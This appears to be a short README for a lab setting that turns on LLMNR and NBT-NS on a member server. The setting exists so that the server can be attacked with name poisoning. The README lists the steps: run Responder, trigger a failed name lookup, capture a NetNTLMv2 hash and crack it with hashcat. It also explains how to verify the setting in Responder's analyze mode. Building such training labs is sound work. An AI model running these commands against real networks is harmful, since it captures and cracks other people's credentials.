# llmnr

Enables LLMNR (`net.llmnr`) and NBT-NS (`net.nbtns`) on a member server. Disable restores the lab's declared `base_settings` values for that host.

Attack (name poisoning):

    responder -I eth1
    # trigger a failed name lookup on the target, e.g. dir \\nonexistent\x
    # captured NetNTLMv2 hash, then crack with hashcat -m 5600

How to verify: run `responder -I eth1 -A` (analyze mode) on Kali, trigger `dir \\nonexistent\x` on the target. Responder logs an LLMNR/NBT-NS query from the target IP when enabled; none when disabled.
